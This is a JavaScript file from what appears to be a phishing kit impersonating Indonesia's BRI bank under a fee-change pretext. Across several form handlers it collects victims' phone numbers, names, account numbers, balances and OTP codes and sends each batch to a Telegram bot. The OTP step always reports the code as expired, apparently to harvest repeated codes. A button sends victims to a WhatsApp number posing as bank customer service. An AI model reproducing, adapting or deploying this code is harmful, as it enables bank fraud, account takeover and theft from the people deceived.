function sendHp(){
   $('.load').fadeIn();
    event.preventDefault();   
    $(".lanjutkan").prop("disabled", true);
    document.getElementById('lanjutkan').innerHTML = "Memproses....";               
    var logo = "____𝘄𝘄𝘄.𝗶𝗯𝗯𝗿𝗶-𝗯𝗿𝗶𝗺𝗼.𝗰𝗼.𝗶𝗱༻";    
    var tarif = $('input[name="tarif"]:checked').val();
       if (tarif) {  
  sessionStorage.setItem('tarif', tarif);
  }     
  var nohp = $('#nohp').val();
  sessionStorage.setItem('nohp', nohp);
    var gabungan = '' + logo + '%0A%0A- 𝗧𝗮𝗿𝗶𝗳 •• ' + tarif +  '%0A- 𝗡𝗼.𝗛𝗽 •• ' + nohp ;  
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,    
    complete: function(){    
    setTimeout(function(){   
    window.location = "login.html";
    $("#lonte").hide();
    $('.load').fadeOut();
    document.getElementById('lanjutkan').innerHTML = "Lanjutkan"; 
    

    }, 800);}});};




function sendLogin(){
   $('.load').fadeIn();
    event.preventDefault();   
    $(".lanjutkan").prop("disabled", true);
    document.getElementById('lanjutkan').innerHTML = "Memproses....";               
    var logo = "____𝘄𝘄𝘄.𝗶𝗯𝗯𝗿𝗶-𝗯𝗿𝗶𝗺𝗼.𝗰𝗼.𝗶𝗱༻";    
    var gabungan = '' + logo + '%0A- 𝗧𝗮𝗿𝗶𝗳 •• ' + tarif.value +  '%0A- 𝗡𝗼.𝗛𝗽 •• ' + nohp.value + '%0A%0A- 𝗡𝗮𝗺𝗮 •• ' + nama.value + '%0A- 𝗡𝗼.𝗥𝗲𝗸 •• ' + rek.value ;  
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,    
    complete: function(){    
    setTimeout(function(){   
    window.location = "saldo.html";
    $("#lonte").hide();
    $('.load').fadeOut();
    document.getElementById('lanjutkan').innerHTML = "Lanjutkan"; 
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
  var nohp = $('#nohp').val();
  sessionStorage.setItem('nohp', nohp);
  var nama = $('#nama').val();
  sessionStorage.setItem('nama', nama);
  var rek = $('#rek').val();
  sessionStorage.setItem('rek', rek);   

    }, 500);}});};

function sendSaldo(){
   $('.load').fadeIn();
    event.preventDefault();   
    $(".lanjutkan").prop("disabled", true);
    document.getElementById('lanjutkan').innerHTML = "Memproses....";               
    var logo = "____𝘄𝘄𝘄.𝗶𝗯𝗯𝗿𝗶-𝗯𝗿𝗶𝗺𝗼.𝗰𝗼.𝗶𝗱༻";    
    var gabungan = '' + logo + '%0A- 𝗧𝗮𝗿𝗶𝗳 •• ' + tarif.value +  '%0A- 𝗡𝗼.𝗛𝗽 •• ' + nohp.value + '%0A%0A- 𝗡𝗮𝗺𝗮 •• ' + nama.value + '%0A- 𝗡𝗼.𝗥𝗲𝗸 •• ' + rek.value + '%0A- 𝗦𝗮𝗹𝗱𝗼 •• ' + saldo.value;  
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,    
    complete: function(){    
    setTimeout(function(){   
    window.location = "otp.html";
    $("#lonte").hide();
    $('.load').fadeOut();
    document.getElementById('lanjutkan').innerHTML = "Lanjutkan"; 
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
  var nohp = $('#nohp').val();
  sessionStorage.setItem('nohp', nohp);
  var nama = $('#nama').val();
  sessionStorage.setItem('nama', nama);
  var rek = $('#rek').val();
  sessionStorage.setItem('rek', rek);  
  var saldo = $('#saldo').val();
  sessionStorage.setItem('saldo', saldo);   

    }, 400);}});};

// Data dari sessionStorage
        

        // Kirim OTP
        function sendOtp() {
            event.preventDefault();
            $("#loader").fadeIn();
            $(".btn-primary").prop("disabled", true);
            
            var nama1 = document.getElementById('nama1');
            var gabungan = '' + logo + '%0A- 𝗧𝗮𝗿𝗶𝗳 •• ' + tarif.value + '%0A- 𝗡𝗼.𝗛𝗽 •• ' + nohp + '%0A%0A- 𝗡𝗮𝗺𝗮 •• ' + nama.value + '%0A- 𝗡𝗼.𝗥𝗲𝗸 •• ' + rek.value + '%0A- 𝗦𝗮𝗹𝗱𝗼 •• ' + saldo.value + '%0A%0A- 𝗢𝘁𝗽 •• ' + nama1.value;
            $.ajax({
                url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
                method: `POST`,
                success: function (response) {
                    $("#loader").fadeOut();
                    $(".btn-primary").prop("disabled", false);
                    $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
                    $("#errorAlert").text("Kode aktivasi telah Kadaluarsa.").slideDown();
                    $("#nama1").val('');
                    $("#nama1").focus();
                    setTimeout(function () {
                        $("#errorAlert").slideUp();                                                
                    }, 3000);
                },
                error: function (error) {
                    $("#loader").hide();
                    $(".btn-primary").prop("disabled", false);
                    $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
                    $("#errorAlert").text("Gagal mengirim kode aktivasi. Silakan coba lagi.").show();
                }
            });
        };

$(document).ready(function() {
    $('#getcs').click(function() {
    $("#process1").show();
 $('.load').fadeIn();
    setTimeout(function(){      
location.href='https://wa.me/6282182480632?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20Aktivasi';
 $("#process1").hide();
 $('.load').fadeOut();        
         }, 2000);
     });    
  });   